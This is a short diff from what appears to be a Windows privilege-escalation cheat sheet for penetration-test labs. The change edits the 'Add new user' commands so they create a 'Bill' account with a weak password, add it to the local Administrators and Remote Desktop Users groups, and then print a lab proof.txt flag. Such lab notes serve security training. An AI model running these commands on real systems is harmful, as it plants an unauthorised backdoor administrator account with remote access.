@@ -346,8 +346,9 @@ shutdown /r /t 0
 https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
 
 #Add new user
-net user test 1234 /add
-net localgroup administrators test /add
+net user Bill Passw0rd /add
+net localgroup administrators Bill /add
+net localgroup "Remote Desktop Users" Bill /add
 
 #Print proof
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
